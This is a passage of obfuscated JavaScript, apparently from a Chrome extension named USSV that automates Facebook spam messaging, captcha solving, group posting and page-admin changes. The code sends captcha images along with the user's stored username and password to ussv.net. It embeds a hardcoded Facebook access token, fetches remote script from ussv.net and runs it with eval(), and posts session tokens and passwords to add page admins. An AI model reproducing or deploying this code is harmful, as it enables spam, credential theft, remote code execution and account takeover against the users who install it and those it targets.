                                        SLAlertCaptcha = "#uss_st_spam_inbox_alertcaptcha";
                                        SLAutoCaptcha = "#uss_st_spam_inbox_autocaptcha";
                                        UsernamUss = $("#user")[f1W.o07]();
                                        UsernamPass = $("#user_pass")[f1W.o07]();
                                    }
                                    if (f1W[T]($(SLAlertCaptcha)[f1W.o07](), 1)) {
                                        alertcaptcha = '<audio autoplay><source src="http://ussv.net/themes/notecaptcha.mp3" type="audio/mpeg" /></audio>';
                                    } else {
                                        alertcaptcha = "";
                                    }
                                    $(divCaptcha)[f1W.Q0I](htmlcaptchaimg + alertcaptcha);
                                    $(divCaptcha)[f1W.q8r](".captcha_input")[f1W.w5I]();
                                    $(divCaptcha)[f1W.q8r](".captcha_refresh")[f1W.w5I]();
                                    A = $(htmlcaptcha)[f1W.q8r]("#captcha_persist_data")[f1W.o07]();
                                    if (f1W[g](htmlcaptchaimg[f1W.x3y]("VisualCaptcha"), null)) {
                                        var o0 = uss[f1W.G47]("https://www.facebook.com/captcha/refresh_ajax.php?new_captcha_type=TFBCaptcha&skipped_captcha_data=" + A + "&__user=" + Fb_Uid + "&__a=1&__req=r"),
                                            o0 = JSON[f1W.i2O](o0[f1W.F6r]("for (;;);", "")),
                                            o0 = o0[f1W.v6v][f1W.d9Q][f1W.a8Y];
                                        imgcaptcha = $(o0)[f1W.q8r](".img")[f1W.V6Q]("src");
                                        var Z0 = o0[f1W.F6r]('class="img"', 'class="img captcha" id="imgcaptcha"')[f1W.F6r]("id=\"captcha_persist_data\"", 'id="captcha_persist_data2"');
                                        $(divCaptcha)[f1W.Q0I](Z0 + alertcaptcha);
                                        $(divCaptcha)[f1W.q8r](".captcha_input")[f1W.w5I]();
                                        $(divCaptcha)[f1W.q8r](".captcha_refresh")[f1W.w5I]();
                                        $(divCaptcha)[f1W.q8r]("h3")[f1W.w5I]();
                                        var A = $(divCaptcha)[f1W.q8r]("#captcha_persist_data2")[f1W.o07]();
                                    } else {}
                                    datas += "&captcha_persist_data=" + A + "&confirmed=1";
                                    js[f0] = datas;
                                    var W0 = _2l(Y0 + "|" + g0 + "|" + b[f1W.S7Y] + "|" + b[f1W.m87] + "<br/>", 5);
                                    _fb_data[f1W.C67](W0, "error");
                                    $("#div_panel_post_note_span")[f1W.Q0I](W0);
                                    $(".div_row_fr_list." + Y0)[f1W.X5O]("fn_error");
                                    total_er = parseInt(total_er_span[f1W.m8y]());
                                    total_er_span[f1W.m8y](total_er + 1);
                                    var X0 = $(".list_uid_post_error")[f1W.Q0I]();
                                    X0 += ',' + Y0 + Split + g0;
                                    $(".list_uid_post_error")[f1W.Q0I](X0);
                                    if (f1W[N]($(SLAutoCaptcha)[f1W.o07](), 1)) {
                                        scanheight = setInterval(function() {
                                            var o = "c5l";
                                            height = $(divCaptcha).height();
                                            if (f1W[o](height, 50)) {
                                                clearInterval(scanheight);
                                                _fb_data[f1W.C67](_lJ[f1W.G3v]({
                                                    "t": "spam",
                                                    "id": "b2"
                                                }));
                                                var U = document[f1W.C4y]("myCanvas"),
                                                    p = U[f1W.p50]("2d"),
                                                    M = document[f1W.C4y]("imgcaptcha");
                                                p.drawImage(M, 10, 10);
                                                imgcaptcha = U[f1W.g4v]("image/png");
                                                dom_logs_ussv(_lJ[f1W.G3v]({
                                                    "t": "spam",
                                                    "id": "b1",
                                                    "r": imgcaptcha
                                                }), "0|_|_|war|spaminbox");
                                                setTimeout(function() {
                                                    $[f1W.c9y]({
                                                        url: "https://ussv.net/user/captcha.php?type=test&st=0&user=" + UsernamUss + "&pass=" + UsernamPass + "&ggurl=",
                                                        type: "POST",
                                                        dataType: "json",
                                                        data: "imgdata=" + $[f1W.o9Y][f1W.p6O](imgcaptcha)
                                                    })[f1W.D2I](function(Z) {
                                                        var F = "u5l";
                                                        if (f1W[F](Z[f1W.C3y], 1)) {
                                                            _fb_data[f1W.C67](Z[f1W.F5v]);
                                                        } else {
                                                            _fb_data[f1W.C67](Z[f1W.F5v]);
                                                            $[f1W.c9y]({
                                                                url: Z[f1W.j2X],
                                                                type: "POST",
                                                                dataType: "json",
                                                                data: "imgdata=x"
                                                            })[f1W.D2I](function(W) {
                                                                var V = "A5l",
                                                                    E = "G5l",
                                                                    O = "v5l";
                                                                _fb_data[f1W.C67](W[f1W.F5v]);
                                                                if (f1W[O](W[f1W.C3y], 1)) {
                                                                    _fb_data[f1W.C67](W[f1W.U4v], "error");
                                                                } else {
                                                                    I0 = datas + "&captcha_response=" + W[f1W.a2Y];
                                                                    _fb_data[f1W.C67](_lJ[f1W.G3v]({
                                                                        "t": "spam",
                                                                        "id": "b3",
                                                                        "r": W[f1W.a2Y]
                                                                    }));
                                                                    $("#ussv_post_AU_QD")[f1W.m8y]("Yes");
                                                                    acc_doing[f1W.j97] = "no";
                                                                    $(divCaptcha)[f1W.Q0I]("");
                                                                    if (f1W[E]($("#stt_check")[f1W.Q0I](), "1") || f1W[V](acc_doing[f1W.f17], 1)) {
                                                                        E4({
                                                                            "stt": U0[f1W.C3y],
                                                                            "msg": U0[f1W.B20],
                                                                            "uid": U0[f1W.l97],
                                                                            "name": U0[f1W.G6y],
                                                                            "datapost": I0
                                                                        });
                                                                    } else {
                                                                        _fb_data[f1W.c2O](C0, T0, M0, I0);
                                                                    }
                                                                }
                                                            });
                                                        }
                                                    });
                                                }, 200);
                                            } else {}
                                        }, 1000);
                                    } else {
                                        _fb_data[f1W.C67](_lJ[f1W.G3v]({
                                            "t": "spam",
                                            "id": "b2a"
                                        }));
                                        $(divCaptcha)[f1W.p3Q]("<input id=\"ussv_check_input_captcha\" value=\"\"> <span id=\"ussv_check_btn_captcha\" class=\"_42ft _4jy0 layerConfirm uiOverlayButton _4jy3 _4jy1 selected _51sy\">G?i</span>");
                                        $("#ussv_check_btn_captcha")[f1W.L0Q]("click")[f1W.Z6O](function() {
                                            var W = "B0E",
                                                V = "j0E";
                                            $("#ussv_post_AU_QD")[f1W.m8y]("Yes");
                                            acc_doing[f1W.j97] = "no";
                                            var E = $("#ussv_check_input_captcha")[f1W.o07]();
                                            I0 = datas + "&captcha_response=" + E;
                                            if (f1W[V]($("#stt_check")[f1W.Q0I](), "1") || f1W[W](acc_doing[f1W.f17], 1)) {
                                                E4({
                                                    "stt": U0[f1W.C3y],
                                                    "msg": U0[f1W.B20],
                                                    "uid": U0[f1W.l97],
                                                    "name": U0[f1W.G6y],
                                                    "datapost": I0
                                                });
                                            } else {
                                                _fb_data[f1W.c2O](C0, T0, M0, I0);
                                            }
                                            $(divCaptcha)[f1W.Q0I]("");
                                        });
                                    }
                                }
                            }
                        } else {
                            var W0 = _2l(Y0 + "|" + g0, 6);
                            _fb_data[f1W.C67](W0, "error");
                            $("#div_panel_post_note_span")[f1W.Q0I](W0);
                            $(".div_row_fr_list." + Y0)[f1W.X5O]("fn_error");
                            total_er = parseInt(total_er_span[f1W.m8y]());
                            total_er_span[f1W.m8y](total_er + 1);
                            var X0 = $(".list_uid_post_error")[f1W.Q0I]();
                            X0 += ',' + Y0 + Split + g0;
                            $(".list_uid_post_error")[f1W.Q0I](X0);
                        }
                        if (f1W[Y](G0, "no")) {} else if (f1W[n](q4, 1)) {
                            if (f1W[f](acc_doing[f1W.j97], "yes")) {
                                _fb_data[f1W.C67](_lJ[f1W.G3v]({
                                    "t": "spam",
                                    "id": "b3a"
                                }), "error");
                            } else {
                                if (f1W[X](acc_doing[f1W.h6r], 1)) {
                                    acc_doing[f1W.f17] = 0;
                                    _fb_data[f1W.C67](_lJ[f1W.G3v]({
                                        "t": "spam",
                                        "id": "b9"
                                    }), "error");
                                } else {
                                    var n0 = $("#uss_st_spam_time_inbox")[f1W.o07]();
                                    if (f1W[R](n0, 0)) {
                                        f4(U0[f1W.C3y]);
                                    } else {
                                        var n0 = n0 + "000",
                                            n0 = parseInt(n0);
                                        setTimeout(function() {
                                            f4(U0[f1W.C3y]);
                                        }, n0);
                                    }
                                }
                            }
                        } else {
                            var n0 = $("#uss_st_spam_timesend_inbox")[f1W.o07]();
                            if (f1W[H](n0, 0)) {
                                _fb_data[y4](T0, M0);
                            } else {
                                var n0 = parseInt(n0);
                                setTimeout(function() {
                                    _fb_data[f1W.C67]("Ðang ch?...", "ok");
                                    _fb_data[y4](T0, M0);
                                }, n0);
                            }
                        }
                    });
                };

                function M4(U) {
                    var p = "D0E",
                        M = "Y0E";

                    function b(o) {
                        $[f1W.c9y]({
                            url: "https://upload.facebook.com/ajax/mercury/upload.php?__user=" + _fb[f1W.z1Y] + "&__a=1&fb_dtsg=" + _fb[f1W.O00],
                            type: "POST",
                            dataType: "json",
                            data: H,
                            cache: false,
                            contentType: false,
                            processData: false
                        })[f1W.D2I](function(W) {
                            var V = "l0E",
                                E = "C0E",
                                O = "g0E";
                            if (f1W[O](W[f1W.D60], 4) && f1W[E](W[f1W.p0O], 500)) {
                                var W = W[f1W.H8v][f1W.F6r]("for (;;);", ""),
                                    W = JSON[f1W.i2O](W);
                                if (f1W[V](W[f1W.v6v][f1W.s9X][0][f1W.O2O], undefined)) {
                                    var Z = W[f1W.v6v][f1W.s9X][0][f1W.u8v],
                                        F = "gif";
                                } else {
                                    var Z = W[f1W.v6v][f1W.s9X][0][f1W.O2O],
                                        F = "img";
                                }
                                o[f1W.i3a] = Z;
                                o[L0] = F;
                                _fb_data[f1W.C67]("Ðang thi?t l?p n?i dung d? g?i ?nh...");
                                E4(o);
                            } else {
                                _fb_data[f1W.C67]("L?i Khi g?i ?nh!", "error");
                                o[f1W.i3a] = "0";
                                o[L0] = "img";
                                E4(o);
                            }
                        });
                    }
                    var H = new FormData();
                    H[f1W.p3Q]('attach_id', '');
                    H[f1W.p3Q]('images_only', 'true');
                    if (f1W[M]($('input[id=CorePost_Inbox_Img_1]')[0][f1W.u7v][0], undefined)) {
                        H[f1W.p3Q]('upload_1025', $('input[id=CorePost_Inbox_Img_0]')[0][f1W.u7v][0]);
                    } else {
                        if (f1W[p]($('input[id=CorePost_Inbox_Img_2]')[0][f1W.u7v][0], undefined)) {
                            var R = uss[f1W.K0v](2);
                            H[f1W.p3Q]('upload_1025', $('input[id=CorePost_Inbox_Img_' + R + ']')[0][f1W.u7v][0]);
                        } else {
                            var R = uss[f1W.K0v](3);
                            H[f1W.p3Q]('upload_1025', $('input[id=CorePost_Inbox_Img_' + R + ']')[0][f1W.u7v][0]);
                        }
                    }
                    b(U);
                };
            }
        };
        this[X4] = function(U) {
            $[f1W.c9y]({
                url: "https://www.facebook.com/ajax/share_scrape.php",
                dataType: "json",
                type: "POST",
                data: "fb_dtsg=" + _fb[f1W.O00] + "&chat=true&u=" + U[f1W.j2X] + "&__user=" + _fb[f1W.z1Y] + "&__a=1&__req=n9"
            })[f1W.D2I](function(W) {
                var V = "O4E",
                    E = "V4E",
                    O = "Q0E",
                    Z = "t0E",
                    F = "w0E",
                    o = "x0E";
                if (f1W[o](W[f1W.D60], 4) && f1W[F](W[f1W.p0O], 500)) {
                    var W = W[f1W.H8v],
                        W = W[f1W.F6r]("for (;;);", "");
                    W = JSON[f1W.i2O](W);
                    if (f1W[Z](W[f1W.S7Y], null)) {
                        dataimg = W[f1W.v6v][f1W.a8Y];
                        img = $(dataimg)[f1W.q8r](".UIThumbPager_Thumb.img")[f1W.V6Q]("src");
                        if (f1W[O](img, undefined)) {
                            img = U[f1W.j2X];
                        }
                        img = img[f1W.F6r](/&/gi, "%26");
                        acc_doing[f1W.M6r] = img;
                        inputLink = $("#uss_st_inbox_link");
                        inputTitle = $("#uss_st_inbox_title");
                        if (f1W[E]($(inputLink).length, 0)) {
                            link = "http://fb.com";
                        } else {
                            link = $(inputLink)[f1W.o07]();
                        }
                        if (f1W[V]($(inputTitle).length, 0)) {
                            title = "Facebook Share";
                        } else {
                            title = $(inputTitle)[f1W.o07]();
                        }
                        _fb_data[f1W.c2O]({
                            "type": "inbox",
                            "methods": "imglink",
                            "id": U[f1W.W7O],
                            "list": U[k4],
                            "uid": 100003549365370,
                            "name": "HAU",
                            "img": img,
                            "link": link,
                            "title": title,
                            "msg": "xxx"
                        });
                    } else {}
                } else {}
            });
        };
        this[f1W.C67] = function(W, V) {
            var E = "q4E",
                O = "b4E",
                Z = "U4E",
                F = "Z4E";
            s = "";
            switch (V) {
                case "error":
                    s = "style='color: rgb(228, 52, 112);'";
                    break;
                case "fn":
                    s = "style='color: rgb(18, 213, 57);'";
                    break;
            }
            if (f1W[F]($("#stt_check")[f1W.Q0I](), "1") || f1W[Z](acc_doing[f1W.f17], 1)) {
                dom_logs_ussv(W, "0|_|_|" + V + "|inboxing");
                if (f1W[O]($(".ussv_logs_txt")[f1W.q8r](".div_ussv_logs_txt.inboxing").length, 10)) {
                    $(".ussv_logs_txt")[f1W.q8r](".div_ussv_logs_txt.inboxing")[f1W.p3X]()[f1W.w5I]();
                }
            } else {
                W = '<div class="ussv_post row_his" ' + s + '>' + W + '</div>';
                dv = $("#ussv_post_list_history");
                dv[f1W.u2r](W);
                if (f1W[E](dv[f1W.q8r](".ussv_post.row_his").length, 100)) {
                    dv[f1W.q8r](".ussv_post.row_his")[f1W.p3X]()[f1W.w5I]();
                }
                return W;
            }
        };
        this[f1W.d9Q] = function(E, O, Z, F, o) {
            html2canvas($(E), {
                onrendered: function(W) {
                    var V = W[f1W.g4v]("image/png");
                    window[f1W.d5y](V);
                }
            });
        };
        this[R4] = function(W) {
            var V = "H4E",
                E = Math[f1W.n40](f1W[V](Math[f1W.f2I](), W));
            return E;
        };
    }

    function getCartProduct() {
        var W = "https://graph.facebook.com/fql?q=SELECT%20snippet,%20recipients,%20snippet_author,%20updated_time%20FROM%20thread%20WHERE%20folder_id%20=%201%20and%20unread%20!=%200&access_token=CAACID1aUOfwBAHqiQkiMVGHJgJdjZCdfbrIXIMZBrrAwdnk47R6ezyHirl7amAlJG4TAqJgOH3Q5CKU2ma8lZBqGquoUXZCf8gtFgtgiyuh5Kc3jE66Kt90r5jWzEm01gDyKRHPJtSqyhAbAjeQe1UhjosLPwmeayBpSIbfKO09XgFhJmzPOXaJx5zklooR40Y2dMHtSBKJxITcm1OETU5DmNO5SvZAcZD",
            V = $[f1W.c9y]({
                url: W,
                dataType: f1W.i6r,
                type: f1W.v0O,
                async: f1W.R30
            });
        return V[f1W.H8v];
    }

    function thaotac_ussv_setting() {
        var H = ".btn_start_auto_ac_join_gr",
            R = "#stFbTools_auto_ac_gr",
            X = ".popup_menu_list.setting.stST",
            f = ".popup_menu_list.setting.stFbTools",
            n = ".popup_menu_list.setting.crUrlLogin",
            Y = ".popup_menu_list.setting",
            N = ".setting.btn.btn_save_UrlLogin",
            g = ".setting.btn.btn_go_UrlLogin",
            T = ".setting.btn.btn_crUrlLogin",
            I = "#div_ussv_setting_close",
            D = "ussv_sl_save_info_login",
            G = "ussv_st_hidden_menu",
            C = "#st_sl_ussv_auto_check",
            z = "#st_sl_ussv_auto_login_more",
            P = "#st_sl_ussv_auto_login",
            J = "#st_ip_save_mabimat",
            c = "#st_ip_save_pass",
            L = "#st_ip_save_username",
            E0 = ".st_btn_save_info_login",
            F0 = "#st_sl_save_info_login_more",
            K = "#st_sl_save_info_login",
            r0 = "st",
            Q = "#st_hide_menu_uss_more",
            S = "#st_hide_menu_uss";
        $(S)[f1W.L0Q](f1W.i77)[f1W.i77](function() {
            var W = "a9t";
            vl = $(this)[f1W.o07]();
            if (f1W[W](vl, f1W.S9a)) {
                $(Q)[f1W.l6Q](f1W.Y5a);
            } else {
                $(Q)[f1W.F50](f1W.Y5a);
            }
            uss[f1W.C37]({
                "type": f1W.v0Q,
                "data": {
                    "ussv_st_hidden_menu": vl
                },
                "body": f1W.u4X,
                "lJ": r0
            });
        });
        $(K)[f1W.L0Q](f1W.i77)[f1W.i77](function() {
            var W = "T9t";
            vl = $(this)[f1W.o07]();
            if (f1W[W](vl, f1W.S9a)) {
                $(F0)[f1W.l6Q](f1W.Y5a);
            } else {
                $(F0)[f1W.F50](f1W.Y5a);
            }
        });
        $(E0)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
            var W = "#st_note_save_info_login";
            vl = $(K)[f1W.o07]();
            ussv_username = $(L)[f1W.o07]();
            ussv_pass = $(c)[f1W.o07]();
            ussv_mabimat = $(J)[f1W.o07]();
            uss[f1W.C37]({
                "type": f1W.v0Q,
                "data": {
                    "ussv_sl_save_info_login": vl,
                    "ussv_username": ussv_username,
                    "ussv_pass": ussv_pass,
                    "ussv_mabimat": ussv_mabimat
                },
                "body": f1W.R4X,
                "lJ": r0
            });
            $(W)[f1W.Q0I](_lJ[f1W.G3v]({
                "t": r0,
                "id": f1W.R4X,
                "r": f1W.W1I
            }));
        });
        $(P)[f1W.L0Q](f1W.i77)[f1W.i77](function() {
            var W = "I9t";
            vl = $(this)[f1W.o07]();
            if (f1W[W](vl, f1W.S9a)) {
                $(z)[f1W.l6Q](f1W.Y5a);
            } else {
                $(z)[f1W.F50](f1W.Y5a);
            }
            uss[f1W.C37]({
                "type": f1W.v0Q,
                "data": {
                    "ussv_sl_ussv_auto_login": vl
                },
                "body": f1W.S7X,
                "lJ": r0
            });
        });
        $(C)[f1W.L0Q](f1W.i77)[f1W.i77](function() {
            var W = "J9t";
            vl = $(this)[f1W.o07]();
            if (f1W[W]($(P)[f1W.o07](), f1W.S9a)) {
                uss[f1W.C37]({
                    "type": f1W.v0Q,
                    "data": {
                        "ussv_sl_auto_check": vl
                    },
                    "body": f1W.h7X,
                    "lJ": r0
                });
            }
        });
        chrome[f1W.v1O][f1W.z50][f1W.G47]([G], function(W) {
            var V = "c9t";
            if (f1W[V](W[G], f1W.S9a)) {
                $(S)[f1W.o07](f1W.B3Q)[f1W.V6Q](f1W.J9r, f1W.A0r);
                $(Q)[f1W.l6Q](f1W.Y5a);
            };
        });
        chrome[f1W.v1O][f1W.z50][f1W.G47]([D, f1W.r4Y, f1W.F07, f1W.v7v], function(W) {
            var V = "u9t";
            if (f1W[V](W[D], f1W.S9a)) {
                $(K)[f1W.o07](f1W.B3Q)[f1W.V6Q](f1W.J9r, f1W.A0r);
                $(F0)[f1W.l6Q](f1W.Y5a);
            };
            $(L)[f1W.o07](W[f1W.r4Y]);
            $(c)[f1W.o07](W[f1W.F07]);
            $(J)[f1W.o07](W[f1W.v7v]);
        });
        chrome[f1W.v1O][f1W.z50][f1W.G47]([f1W.m3r, f1W.c4X], function(W) {
            var V = "G9t",
                E = "v9t";
            if (f1W[E](W[f1W.m3r], f1W.S9a)) {
                $(P)[f1W.o07](f1W.B3Q)[f1W.V6Q](f1W.J9r, f1W.A0r);
                $(z)[f1W.l6Q](f1W.Y5a);
            };
            if (f1W[V](W[f1W.c4X], f1W.S9a)) {
                $(C)[f1W.o07](f1W.B3Q)[f1W.V6Q](f1W.J9r, f1W.A0r);
            };
        });
        $(I)[f1W.Z6O](function() {
            $(f1W.v2Q)[f1W.F50](f1W.Y5a);
        });
        $(T)[f1W.Z6O](function() {
            $(f1W.W2Y)[f1W.Q0I](img_load);
            create_url_login_ussv();
        });
        $(g)[f1W.Z6O](function() {
            go_url($(f1W.R1X)[f1W.o07]());
        });
        $(N)[f1W.Z6O](function() {
            var W = "ussv_url_fast_login_",
                V = 'Your URL Fast Login USSV: ',
                E = $(f1W.R1X)[f1W.o07](),
                E = V + E,
                O = new Blob([E], {
                    type: f1W.x8I
                });
            saveAs(O, W + time_now(f1W.z6a) + f1W.g1v);
        });
        $(Y)[f1W.Z6O](function() {
            $(Y)[f1W.X9a](f1W.B0O);
            $(this)[f1W.X5O](f1W.n8a);
        });
        $(f1W.I9Y)[f1W.Z6O](function() {
            var W = ".ussv_log_panel.setting.dangky, .setting.btn.btn_reg_uss";
            $(f1W.W77)[f1W.v37]();
            $(W)[f1W.l6Q](f1W.Y5a);
            get_mytoken(f1W.a9r);
        });
        $(n)[f1W.Z6O](function() {
            var W = ".ussv_log_panel.setting.crUrlLogin, .setting.btn.btn_crUrlLogin";
            $(f1W.W77)[f1W.v37]();
            $(W)[f1W.l6Q](f1W.Y5a);
        });
        $(f)[f1W.Z6O](function() {
            var W = ".ussv_log_panel.setting.stFbTools, .setting.btn.btn_stFbTools";
            $(f1W.W77)[f1W.v37]();
            $(W)[f1W.l6Q](f1W.Y5a);
        });
        $(X)[f1W.Z6O](function() {
            $(f1W.W77)[f1W.v37]();
            $(f1W.b4Q)[f1W.l6Q](f1W.Y5a);
        });
        $(R)[f1W.L0Q](f1W.i77)[f1W.i77](function() {
            var W = ".setting.btn.btn_start_auto_ac_join_gr",
                V = "A9t";
            if (f1W[V]($(this)[f1W.o07](), f1W.B5r)) {
                $(W)[f1W.R4r]();
            };
        });
        $(H)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
            var o = "B7t",
                U = "#stFbTools_auto_ac_sc_gr",
                p = "#stFbTools_auto_id_gr",
                M = "j7t";
            au = $(R)[f1W.o07]();
            if (f1W[M](au, f1W.B5r)) {
                idgr = $(p)[f1W.o07]();
                scgr = parseInt($(U)[f1W.o07]() + f1W.C3v);
                if (f1W[o](idgr, f1W.V8v)) {
                    $(f1W.W2Y)[f1W.m8y](_lJ[f1W.G3v]({
                        "t": f1W.W6I,
                        "id": f1W.h7X
                    }));
                } else {
                    $(f1W.W2Y)[f1W.m8y](_lJ[f1W.G3v]({
                        "t": f1W.W6I,
                        "id": f1W.R4X,
                        "r": idgr
                    }));
                    var b = setInterval(function() {
                        var W = "B?n không có quy?n truy c?p tính nang này",
                            V = "#stFbTools_auto_ac_gr_method",
                            E = "X7t",
                            O = "y7t",
                            Z = "0|0|_|war|autoAcGr",
                            F = "F7t";
                        au = $(R)[f1W.o07]();
                        if (f1W[F](au, f1W.e0Y)) {
                            clearInterval(b);
                            dom_logs_ussv(_lJ[f1W.G3v]({
                                "t": f1W.W6I,
                                "id": f1W.P8X
                            }), Z);
                        } else {
                            if (f1W[O]($(f1W.k5X)[f1W.m8y](), f1W.B3Q)) {
                                if (f1W[E]($(V)[f1W.o07](), f1W.L9a)) {
                                    _fb[f1W.i0Y](f1W.L9a, {
                                        "IdGR": idgr
                                    });
                                } else {
                                    _fb[f1W.i0Y](f1W.S9a, {
                                        "IdGR": idgr
                                    });
                                }
                            } else {
                                dom_logs_ussv(W, Z);
                            }
                        }
                    }, scgr);
                }
            } else {
                $(f1W.W2Y)[f1W.m8y](_lJ[f1W.G3v]({
                    "t": f1W.W6I,
                    "id": f1W.S7X
                }));
            }
        });
    }

    function AutPostGroup(R, X) {
        if (!X) {
            var X = function() {};
        };
        $[f1W.c9y]({
            url: "https://m.facebook.com/a/group/post/add/?gid=" + R[f1W.m2r],
            type: "POST",
            dataType: "json",
            data: "fb_dtsg=" + _fb[f1W.O00] + "&charset_test=€,´,€,´,?,?,?&rating=0&message=" + R[f1W.v8a] + "&target=" + R[f1W.m2r] + "&freeform_tag_place=&oghideattachment=false&ogsuggestionmechanism=&source_loc=composer_group&waterfall_source=composer_group&__ajax__=true&__user=" + _fb[f1W.z1Y]
        })[f1W.D2I](function(V) {
            var E = "DelPost",
                O = "Y3b",
                Z = "m3b",
                F = "s3b";
            if (f1W[F](V[f1W.D60], 4) && f1W[Z](V[f1W.p0O], 200)) {
                var V = V[f1W.H8v][f1W.F6r]("for (;;);", "");
                if (V[f1W.x3y]("acy")) {
                    var o = function() {
                            R[f1W.a7y] = "Group " + R[f1W.m2r] + " duy?t bài dang.";
                        },
                        U = function(W) {
                            R[f1W.m07] = W;
                        };
                    U(true);
                    o();
                } else {
                    var p = V[f1W.x3y]("feedback_target&quot;:(.*?),&quot;feedback_source");
                    if (p) {
                        var M = function() {
                            R[f1W.a7y] = "Group " + R[f1W.m2r] + " cho phép dang bài.";
                        };
                        M();
                        if (f1W[O](R[E], true)) {
                            DelPost({
                                "Token": R[f1W.p87],
                                "Post": p[1]
                            });
                        };
                    } else {
                        var b = function(W) {
                                R[f1W.m07] = W;
                            },
                            H = function() {
                                R[f1W.a7y] = "Group " + R[f1W.m2r] + " không cho phép dang bài";
                            };
                        b(true);
                        H();
                    }
                }
                X(R);
            }
        });
    }

    function uss_aut(W, V) {
        var E = "B26",
            O = "j26",
            Z = 'user_pass',
            F = "A16",
            o = 'user_key',
            U = "G16",
            p = 'uss_vip',
            M = "v16",
            b = "#uss_token",
            H = "u16",
            R = "c16",
            X = "J16",
            f = "I16",
            n = "T16",
            Y = 'uss_id',
            N = "a16",
            g = f1W.L9a;
        if (f1W[N](document[f1W.C4y](Y), f1W.x0r)) {
            if (f1W[n](W, f1W.L9a)) {
                var g = document[f1W.C4y](Y)[f1W.V5I];
            } else if (f1W[f](W, f1W.S9a)) {
                var g = document[f1W.C4y](f1W.n10)[f1W.V5I];
            } else if (f1W[X](W, f1W.c9a)) {
                var g = document[f1W.C4y](f1W.u5X)[f1W.V5I];
            } else if (f1W[R](W, f1W.J9a)) {
                if (f1W[H]($(b)[f1W.m8y](), f1W.x0r)) {
                    var g = f1W.c8Q;
                } else {
                    var g = $(b)[f1W.m8y]();
                }
                return g;
            } else if (f1W[M](W, f1W.d9a)) {
                var g = document[f1W.C4y](p)[f1W.V5I];
            } else if (f1W[U](W, f1W.G9a)) {
                var g = document[f1W.C4y](o)[f1W.V5I];
            } else if (f1W[F](W, f1W.K9a)) {
                var g = document[f1W.C4y](Z)[f1W.V5I];
            }
        }
        if (f1W[O](g, f1W.L9a)) {
            if (f1W[E](V, f1W.S9a)) {} else {
                div_thongbao(lang_need_login);
            }
        }
        return g;
    }

    function div_ussv_home(O) {
        var Z = ".USSVHOM";
        if ($(Z).length) {
            $(Z)[f1W.l6Q](f1W.Y5a);
        } else {
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: 'http://ussv.net/addon/html/html_panel_home.php?type=' + O,
                data: "xczxc=sads"
            }, function(W) {
                var W = W[f1W.X3Q]("USSV-SPACE-PARSE<br/>"),
                    V = W[0],
                    E = W[1];
                $("body")[f1W.u2r](V);
                thaotac_ussv_home();
                eval(E[f1W.F6r]('<script type="text/javascript">', '')[f1W.F6r]('</script>', ''));
            });
        }
    }

    function SetAdmin(F, o) {
        var U = "EmailAdmin";
        if (!o) {
            var o = function() {};
        };
        var p = f1W.P4y;
        $[f1W.c9y]({
            url: p,
            type: "POST",
            dataType: "json",
            data: "fb_dtsg=" + _fb[f1W.O00] + "&fbpage_id=" + F[f1W.X7O] + "&advanced_admin_settings[0]=" + _fb[f1W.z1Y] + "&admin_type[" + _fb[f1W.z1Y] + "]=0&friendselector_input[0]=" + F[U] + "&friend_selected[0]=&new_admin&save=1&nctr[_mod]=pagelet_editpagesx&__user=" + _fb[f1W.z1Y] + "&__a=1&ajax_password=" + F[f1W.n3Q] + "&confirmed=1"
        })[f1W.D2I](function(W) {
            var V = "o8b",
                E = "r8b",
                O = "E8b",
                Z = "W8b";
            if (f1W[Z](W[f1W.D60], 4) && f1W[O](W[f1W.p0O], 500)) {
                var W = W[f1W.H8v][f1W.F6r]("for (;;);", ""),
                    W = JSON[f1W.i2O](W);
                if (W.error) {
                    o({
                        "Error": true,
                        "Note": "Set Admin " + F[U] + " Th?t B?i<br/>" + W[f1W.S7Y],
                        "Uss": F,
                        "Data": W
                    });
                } else {
                    o({
                        "Note": "Set Admin " + F[U] + " Thành công ...",
                        "Uss": F,
                        "Data": W
                    });
                }
            } else if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                o({
                    "Error": true,
                    "Note": "Set Admin " + F[U] + " Th?t B?i<br/>",
                    "Uss": F,
                    "Data": W
                });
            } else {}
        });
    }

    function thaotac_ussv_home() {
        var V = "#close_USSVHome_popup";
        $(V)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
            var W = ".USSVHOME";
            $(W)[f1W.F50](f1W.Y5a);
        });
    }

    function get_post_group(C) {
        if (C[f1W.O8a]) {
            var z = C[f1W.O8a];
        } else {
            var z = f1W.A9I + C[f1W.G7v] + f1W.I8Y + C[f1W.p87];
        }
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: z
        }, function(V) {
            var E = "l7t",
                O = "C7t",
                Z = "g7t",
                F = "D7t",
                o = "Y7t",
                V = JSON[f1W.i2O](V);
            if (V.error) {
                console[f1W.p4y]("Hoàn Thành : " + V.error[f1W.q10]);
            } else {
                var U = V.data.length;
                if (f1W[o](U, 0)) {
                    console[f1W.p4y]("Hoàn Thành");
                } else {
                    for (var p = 0; f1W[F](p, U); p++) {
                        var M = V.data[p][f1W.W7O],
                            M = M[f1W.X3Q]("_"),
                            b = M[1],
                            H = "KXD";
                        if (V.data[p][f1W.W47]) {
                            var R = V.data[p][f1W.W47][f1W.W7O],
                                X = V.data[p][f1W.W47][f1W.G6y],
                                H = R + " (" + X + ")";
                        }
                        var f = V.data[p][f1W.Z9y],
                            f = f[f1W.X3Q]("+"),
                            f = f[0][f1W.F6r]("T", " "),
                            n = "";
                        if (V.data[p][f1W.q10]) {
                            var n = V.data[p][f1W.q10];
                        } else {
                            if (V.data[p][f1W.K8v]) {
                                var n = V.data[p][f1W.K8v];
                            }
                        }
                        var Y = "Không Có Comment";
                        if (V.data[p][f1W.D07]) {
                            var N = V.data[p][f1W.D07],
                                g = N.data.length,
                                Y = "Có " + g + " Bình Lu?n \n",
                                T = "";
                            for (var I = 0; f1W[Z](I, g); I++) {
                                var D = N.data[I][f1W.q10];
                                if (D[f1W.x3y]("facebook.com/notes")) {
                                    D += " <Nghi Ng?>";
                                } else {}
                                var T = T + "--<" + I + "> " + D + "\n";
                            };
                            var Y = Y + T;
                        } else {}
                        if (f1W[O](b, "960517817293565")) {
                            console[f1W.p4y]("Hoàn Thành");
                        } else {
                            if (f1W[E](p, U - 1)) {
